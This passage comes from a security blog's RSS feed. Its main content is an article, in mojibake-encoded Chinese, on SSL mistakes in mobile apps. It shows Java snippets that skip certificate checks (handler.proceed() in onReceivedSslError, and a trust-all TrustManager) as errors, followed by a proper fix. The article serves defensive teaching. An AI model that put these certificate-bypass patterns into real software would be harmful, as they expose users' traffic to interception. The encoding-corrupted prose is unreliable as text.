href=&quot;http://devco.re/blog/2014/03/14/3rd-party-software-security-issues/&quot;&gt;ç¬¬ä¸‰æ–¹å¥—ä»¶&lt;/a&gt;æ˜¯å¦æœ‰å®‰å…¨æ›´æ–°ã€‚&lt;/p&gt;

&lt;p&gt;å¸Œæœ›æ˜å¹´ä¸éœ€è¦å†æœ‰ä¸€ç¯‡ã€ä¾èˆŠæ²’æ”¹è®Šçš„è³‡è¨Šæ´©æ¼ã€ï¼å¤§å®¶å¿«é»æ³¨æ„é€™ä»¶ç°¡å–®çš„äº‹æƒ…å§ï¼&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2014/08/26/information-leakage-in-taiwan-HITCON2014/</link>
                <guid>https://devco.re/blog/2014/08/26/information-leakage-in-taiwan-HITCON2014</guid>
                <pubDate>Tue, 26 Aug 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>æ‰‹æ©Ÿæ‡‰ç”¨ç¨‹å¼é–‹ç™¼ä¸Šè¢«å¿½ç•¥çš„ SSL è™•ç†</title>
                <description>&lt;p&gt;åœ¨ç¶²è·¯ä¸Šå‚³è¼¸æ•æ„Ÿè³‡è¨Šæ™‚ï¼Œé€šå¸¸æœƒä½¿ç”¨ HTTPS å”å®šï¼Œè®“å®¢æˆ¶ç«¯èˆ‡ä¼ºæœå™¨ç«¯å°è³‡æ–™é€²è¡Œ SSL åŠ å¯†è™•ç†ï¼Œä»¥é™ä½è³‡æ–™åœ¨å‚³è¼¸éç¨‹ä¸­è¢«ç›£è½æˆ–ä¸­é–“äººæ”»æ“Šçš„é¢¨éšªã€‚HTTPS çš„é‡è¦æ€§é€æ¼¸è¢«é‡è¦–ï¼ŒGoogle é™¤äº†é è¨­é–‹å•Ÿ HTTPS ä¹‹å¤–ï¼Œæœªä¾†æ›´æœƒå°‡ &lt;a href=&quot;http://googlewebmastercentral.blogspot.tw/2014/08/https-as-ranking-signal.html&quot;&gt;HTTPS çš„ç¶²ç«™æœå°‹æ’ååŠ åˆ†&lt;/a&gt;ã€‚ä½†ç‚ºäº†ç¢ºä¿å‚³è¼¸çš„å®‰å…¨ï¼Œéç¨‹ä¸­å®¢æˆ¶ç«¯æœƒæ ¸å°ä¼ºæœå™¨çš„æ†‘è­‰éˆ (certificate chain) æ˜¯å¦æœ‰æ•ˆï¼Œè‹¥åˆ¤å®šç‚ºç„¡æ•ˆæ™‚æœƒä½œå‡ºè­¦å‘Šã€‚(è©³è¦‹&lt;a href=&quot;http://en.wikipedia.org/wiki/Secure_Sockets_Layer&quot;&gt;Wikipedia&lt;/a&gt;)&lt;/p&gt;

&lt;!-- more --&gt;
&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140815/desktop_browser_insecure_warning.png&quot; alt=&quot;Desktop è­¦å‘Šåœ–&quot; /&gt;
è€Œåœ¨æ‰‹æ©Ÿæ‡‰ç”¨ç¨‹å¼ä¸Š HTTPS åŒæ¨£é‡è¦ï¼Œä¾‹å¦‚ç¶²è·¯éŠ€è¡Œã€ç·šä¸Šè³¼ç‰©ç­‰ã€‚ç³»çµ±åŒæ¨£æœƒåšæ†‘è­‰æ ¸å°ï¼Œä½†å°è¢«åˆ¤å®šç‚ºç„¡æ•ˆçš„æ†‘è­‰å°±éœ€è¦é–‹ç™¼è€…ä½œå‡ºé¡å¤–çš„è™•ç†äº†ã€‚è¨±å¤šæ‰‹æ©Ÿæ‡‰ç”¨ç¨‹å¼é–‹ç™¼å•†åœ¨é€™å€‹éƒ¨åˆ†ä¸¦æ²’æœ‰å¦¥å–„è™•ç†å¥½ï¼Œä»¥ä¸‹æˆ‘å€‘å°±å¹¾å€‹å¸¸è¦‹çš„æˆå› åšåŸºæœ¬çš„æ¢è¨ã€‚&lt;/p&gt;

&lt;h3 id=&quot;æœƒè¢«ç³»çµ±åˆ¤å®šç‚ºç„¡æ•ˆçš„å¸¸è¦‹æˆå› &quot;&gt;æœƒè¢«ç³»çµ±åˆ¤å®šç‚ºç„¡æ•ˆçš„å¸¸è¦‹æˆå› ï¼Ÿ&lt;/h3&gt;
&lt;p&gt;åœ¨æ¢è¨è©²å¦‚ä½•è™•ç†é€™å€‹å•é¡Œä¹‹å‰ï¼Œé€™è£¡å…ˆåˆ—å‡ºä¸€äº›æœ‰å¯èƒ½è¢«ç³»çµ±åˆ¤å®šæˆç„¡æ•ˆæ†‘è­‰çš„æˆå› ã€‚&lt;/p&gt;

&lt;h4 id=&quot;1-ç³»çµ±æ”¯æ´å•é¡Œ-&quot;&gt;1. ç³»çµ±æ”¯æ´å•é¡Œ &lt;sup id=&quot;fnref:note1&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:note1&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;/h4&gt;
&lt;p&gt;åœ¨ Android 2.2 åŠä¹‹å‰çš„ç‰ˆæœ¬ï¼Œå° SSL çš„æ”¯æ´ä¸Šå­˜åœ¨è‘—ä¸€äº›å•é¡Œï¼Œåƒæ˜¯ &lt;a href=&quot;https://code.google.com/p/android/issues/detail?id=12908&quot;&gt;SNI&lt;/a&gt; å’Œ &lt;a href=&quot;https://code.google.com/p/android/issues/detail?id=26542&quot;&gt;Multiple Chain&lt;/a&gt;ã€‚è€Œ Android ä¸Šä¸æ¥å—ç¼ºå°‘ä¸­ç¹¼ CA æ†‘è­‰çš„æ†‘è­‰éˆï¼Œä¾‹å¦‚ï¼š&lt;a href=&quot;https://egov.uscis.gov/&quot;&gt;https://egov.uscis.gov/&lt;/a&gt;&lt;/p&gt;

&lt;h4 id=&quot;2-ç›¸é—œæ†‘è­‰æœªè¢«é è¼‰åˆ°ç³»çµ±ä¸­&quot;&gt;2. ç›¸é—œæ†‘è­‰æœªè¢«é è¼‰åˆ°ç³»çµ±ä¸­&lt;/h4&gt;
&lt;p&gt;ä»¥ GCA ç°½ç™¼çš„ SSL æ†‘è­‰ç‚ºä¾‹ï¼Œåœ¨ Windows ä¸Šè¢«åˆ¤å®šç‚ºæœ‰æ•ˆï¼Œä½†åœ¨ iOS ç³»çµ±ä¸Šå»å› ç‚º CA ä¸åœ¨ç³»çµ±çš„é è¼‰æ¸…å–®ä¸­è€Œè¢«åˆ¤å®šç‚ºç„¡æ•ˆã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140815/windows_recognize_gca.png&quot; alt=&quot;Windows&quot; /&gt;
&lt;img src=&quot;/assets/img/blog/20140815/iphone_unknown_ca.png&quot; alt=&quot;iPhone&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;3-ä½¿ç”¨è‡ªè¡Œç°½ç™¼çš„æ†‘è­‰&quot;&gt;3. ä½¿ç”¨è‡ªè¡Œç°½ç™¼çš„æ†‘è­‰&lt;/h4&gt;
&lt;p&gt;é€™ç¨®æƒ…æ³å¸¸å‡ºç¾åœ¨æ‡‰ç”¨ç¨‹å¼é–‹ç™¼éšæ®µçš„å…§éƒ¨æ¸¬è©¦ç’°å¢ƒä¸­ï¼Œç”±æ–¼æ˜¯å…§éƒ¨æ¸¬è©¦ç’°å¢ƒä¸€èˆ¬éƒ½ä¸æœƒèŠ±éŒ¢å»ç”³è«‹æ†‘è­‰ã€‚&lt;/p&gt;

&lt;h4 id=&quot;4-é€£ç·šè¢«ä¸­é–“äººmitmæ”»æ“Š&quot;&gt;4. é€£ç·šè¢«ä¸­é–“äºº(MITM)æ”»æ“Š&lt;/h4&gt;
&lt;p&gt;ç•¶é€£ç·šè¢« MITM æ”»æ“Šæ™‚ï¼Œä½¿ç”¨è€…åŸæœ¬çš„é€£ç·šç›®çš„åœ°æœƒè¢«å°åˆ°æ”»æ“Šè€…çš„è¨­å‚™ä¸Šï¼Œæ­¤æ™‚ä¼ºæœå™¨æ†‘è­‰ä¹Ÿæœƒè¢«å–ä»£æˆæ”»æ“Šè€…è‡ªè¡Œç°½ç™¼çš„æ†‘è­‰ï¼Œé€ æˆåŸæœ¬æ­£å¸¸çš„é€£ç·šå‡ºç¾ç•°å¸¸ã€‚&lt;/p&gt;

&lt;h3 id=&quot;é–‹ç™¼è€…è©²å¦‚ä½•è™•ç†&quot;&gt;é–‹ç™¼è€…è©²å¦‚ä½•è™•ç†ï¼Ÿ&lt;/h3&gt;

&lt;p&gt;ç†æƒ³æƒ…æ³ä¸‹ï¼Œå®¢æˆ¶ç«¯çš„æ”¯æ´åº¦å……è¶³ï¼Œä¼ºæœå™¨æ†‘è­‰éˆçš„ä¾†æºåŠè¨­å®šæ­£ç¢ºï¼Œåªéœ€ä½¿ç”¨ç³»çµ±åŸæœ‰çš„æ–¹å¼å»æª¢æŸ¥æ†‘è­‰å³å¯é”åˆ°å®‰å…¨æ•ˆæœã€‚ä½†è‹¥éå¾—è¦ç›¸å®¹ä½ç‰ˆæœ¬ç³»çµ±æˆ–æ˜¯è‡ªè¡Œç°½ç™¼æ†‘è­‰çš„æ™‚å€™ï¼Œå°±å¾—è‡ªè¡Œåšé¡å¤–çš„æª¢æŸ¥ã€‚&lt;/p&gt;

&lt;p&gt;åœ¨è™•ç†æ–¹å¼ä¸Šï¼Œæ™®éæ˜¯ä½¿ç”¨æ†‘è­‰ç¶å®š (certificate pinning) çš„æ–¹å¼ï¼ŒæŠŠéœ€è¦æ¯”å°çš„æ†‘è­‰é å…ˆå­˜æ”¾åœ¨æ‡‰ç”¨ç¨‹å¼è£¡ï¼Œå¾…è¦é€²è¡Œ SSL Handshake çš„æ™‚å€™å†èˆ‡ä¼ºæœå™¨çš„æ†‘è­‰åšæ¯”å°ã€‚&lt;/p&gt;

&lt;p&gt;å¯æ˜¯åœ¨å¯¦å‹™ä¸Šï¼Œå¤§å¤šé–‹ç™¼äººå“¡æ¡ç”¨æ¶ˆæ¥µçš„æ–¹æ³•ï¼ŒæŠŠéŒ¯èª¤è­¦å‘Šç•¥éè®“é€£ç·šç¹¼çºŒé€²è¡Œï¼Œä½¿å¾—æœ¬ä¾†ä½¿ç”¨ SSL åŠ å¯†é€£ç·šå¸¶ä¾†çš„å®‰å…¨æ€§å½¢åŒè™›è¨­ã€‚æ“š 2012 å¹´ &lt;a href=&quot;http://android-ssl.org/files/p50-fahl.pdf&quot;&gt;Why Eve and Mallory Love Android: An Analysis of SSL (In)Security on Android&lt;/a&gt; é€™ç¯‡è«–æ–‡æŒ‡å‡ºï¼Œåœ¨ Google Play ä¸Š 13500 å€‹å…è²»ç†±é–€æ‡‰ç”¨ç¨‹å¼ç•¶ä¸­ï¼Œå…±æœ‰ 1074 å€‹ (8%) æ‡‰ç”¨ç¨‹å¼å› éŒ¯èª¤çš„ SSL è™•ç†è€Œå°è‡´ä½¿ç”¨è€…é™·å…¥ MITM æ”»æ“Šçš„é¢¨éšªä¸­ã€‚&lt;/p&gt;

&lt;p&gt;ä¸‹é¢æˆ‘å€‘æ•´ç†äº†ä¸€äº›åœ¨æ‰‹æ©Ÿæ‡‰ç”¨é–‹ç™¼ä¸Šï¼Œå¸¸è¦‹çš„ SSL è™•ç†éŒ¯èª¤ï¼Œä»¥åŠå…¶å°æ‡‰é©ç•¶çš„è™•ç†æ–¹æ³•ã€‚&lt;/p&gt;

&lt;h4 id=&quot;android-éŒ¯èª¤è™•ç†æƒ…æ³1&quot;&gt;Android éŒ¯èª¤è™•ç†æƒ…æ³1&lt;/h4&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;onReceivedSslError&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;WebView&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;view&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;SslErrorHandler&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;SslError&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;proceed&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;ç•¶é€é WebView å…ƒä»¶è¨ªå• HTTPS ç¶²ç«™ç™¼ç”Ÿ SSL éŒ¯èª¤æ™‚ï¼Œæœƒè§¸ç™¼ onReceivedSslError é€™å€‹å‡½æ•¸ã€‚æ ¹æ“šå®˜æ–¹æ–‡ä»¶æŒ‡å‡ºï¼Œå¯è—‰ç”±åŸ·è¡Œ handler.proceed() æˆ–æ˜¯ handler.cancel() ä¾†æ±ºå®šæ˜¯å¦è®“é€£ç·šç¹¼çºŒé€²è¡Œã€‚åœ¨ä¸è¦†å¯«é€™å‡½æ•¸çš„æƒ…æ³ä¸‹é è¨­æœƒåŸ·è¡Œ handler.cancel()ã€‚è€Œä¸Šé¢çš„åšæ³•å»è®“ç•°å¸¸çš„é€£ç·šç¹¼çºŒé€²è¡Œäº†ã€‚&lt;/p&gt;

&lt;p&gt;è¼ƒç‚ºæ°ç•¶çš„åšæ³•æ˜¯ä½¿ç”¨ handler.cancel() è®“é€£ç·šçµ‚æ­¢ï¼Œæˆ–æ˜¯é™åˆ¶åœ¨é–‹ç™¼éšæ®µæ‰åŸ·è¡Œ handler.proceed()ã€‚åƒ &lt;a href=&quot;https://github.com/apache/cordova-android/blob/3.5.1/framework/src/org/apache/cordova/CordovaWebViewClient.java#L298&quot;&gt;Apache Coradova&lt;/a&gt; å’Œ &lt;a href=&quot;https://github.com/facebook/facebook-android-sdk/blob/sdk-version-3.15.0/facebook/src/com/facebook/widget/WebDialog.java#L420&quot;&gt;Facebook Android SDK&lt;/a&gt; çš†æœ‰å°é€™éƒ¨åˆ†åšæ§ç®¡ã€‚&lt;/p&gt;

&lt;h4 id=&quot;android-éŒ¯èª¤è™•ç†æƒ…æ³2&quot;&gt;Android éŒ¯èª¤è™•ç†æƒ…æ³2&lt;/h4&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;nc&quot;&gt;TrustManager&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;trustAllManager&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;TrustManager&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;X509TrustManager&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;checkClientTrusted&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;X509Certificate&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;authType&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;checkServerTrusted&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;X509Certificate&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;authType&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;X509Certificate&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getAcceptedIssuers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;};&lt;/span&gt;

&lt;span class=&quot;nc&quot;&gt;SSLContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sslContext&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;SSLContext&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInstance&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;TLS&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;sslContext&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;trustAllManager&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;æœ¬ç”¨ä¾†æª¢æŸ¥ä¼ºæœå™¨æ†‘è­‰çš„ checkServerTrusted è¢«ç•™ç©ºï¼Œå°è‡´è­¦å‘Šè¢«ç•¥éã€‚Google å»ºè­°ä¸è¦è‡ªè¡Œå¯¦ä½œ TrustManagerï¼Œè€Œæ˜¯æŠŠæ†‘è­‰æ”¾åˆ° KeyStoreï¼Œå†æŠŠ KeyStore æ”¾åˆ° TrustManagerFactoryï¼Œæœ€å¾Œå¾ TrustManagerFactory ç”¢å‡ºç›¸é—œçš„ TrustManagerï¼Œé–‹ç™¼æ–‡ä»¶ä¸­æœ‰æä¾›è™•ç†çš„&lt;a href=&quot;https://developer.android.com/training/articles/security-ssl.html#UnknownCa&quot;&gt;ç¯„ä¾‹&lt;/a&gt;ã€‚OWASP çš„ WIKI ä¸Šä¹Ÿæœ‰æä¾›è‡ªè¡Œå¯¦ä½œ TrustManager åš certificate pinning çš„&lt;a href=&quot;https://www.owasp.org/index.php/Certificate_and_Public_Key_Pinning#Android&quot;&gt;ç¯„ä¾‹&lt;/a&gt;ã€‚&lt;sup id=&quot;fnref:note2&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:note2&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;2&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;

&lt;p&gt;ä¸‹é¢ç¯€éŒ„ Android å®˜æ–¹æ–‡ä»¶ä¸Šçš„ç¯„ä¾‹ï¼š&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;nc&quot;&gt;KeyStore&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;keyStore&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;...;&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;algorithm&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;TrustManagerFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getDefaultAlgorithm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;TrustManagerFactory&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;TrustManagerFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInstance&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;algorithm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;tmf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;keyStore&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;nc&quot;&gt;SSLContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;SSLContext&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInstance&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;TLS&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getTrustManagers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;no&quot;&gt;URL&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;URL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://www.example.com/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;HttpsURLConnection&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urlConnection&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;HttpsURLConnection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;openConnection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;urlConnection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setSSLSocketFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getSocketFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;InputStream&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urlConnection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h4 id=&quot;android-éŒ¯èª¤è™•ç†æƒ…æ³3&quot;&gt;Android éŒ¯èª¤è™•ç†æƒ…æ³3&lt;/h4&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;no&quot;&gt;URL&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;URL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://www.example.com/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
